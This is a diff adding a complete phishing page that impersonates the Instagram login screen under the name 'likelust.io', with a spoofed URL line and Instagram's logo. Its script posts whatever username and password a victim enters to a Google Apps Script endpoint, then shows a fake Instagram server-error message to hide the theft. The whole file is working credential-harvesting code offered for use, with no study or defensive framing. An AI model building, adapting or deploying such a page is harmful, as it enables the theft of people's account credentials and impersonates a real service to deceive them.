@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>likelust.io</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 300px;
+      text-align: center;
+    }
+    .fake-url {
+      font-size: 0.8em;
+      color: #999;
+      margin-bottom: 10px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+    }
+    button {
+      background: #3897f0;
+      color: white;
+      cursor: pointer;
+    }
+    img {
+      width: 180px;
+      margin-bottom: 20px;
+    }
+    .error-screen {
+      text-align: center;
+      padding: 20px;
+      font-family: sans-serif;
+    }
+    .error-screen h1 {
+      font-size: 40px;
+      margin: 0;
+    }
+    .error-screen p {
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box" id="loginBox">
+    <p class="fake-url">https://likelust.io/accounts/login</p>
+    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+    <form id="phishForm">
+      <input type="text" id="username" placeholder="Phone number, username, or email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+  </div>
+
+  <div class="error-screen" id="errorScreen" style="display:none;">
+    <h1>404</h1>
+    <p>Server Error — Instagram servers are currently unavailable due to too many login requests.</p>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwayzIO7vqUde0mkwgXqNgoN6cTvN3UlQbRphWH8nOxfjQ2kv-Mc2gQa4AX3SBaYksY/exec';
+
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const data = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { "Content-Type": "application/json" }
+      }).then(() => {
+        document.getElementById('loginBox').style.display = 'none';
+        document.getElementById('errorScreen').style.display = 'block';
+      }).catch(() => {
+        alert("Failed to send data");
+      });
+    });
+  </script>
+</body>
+</html>
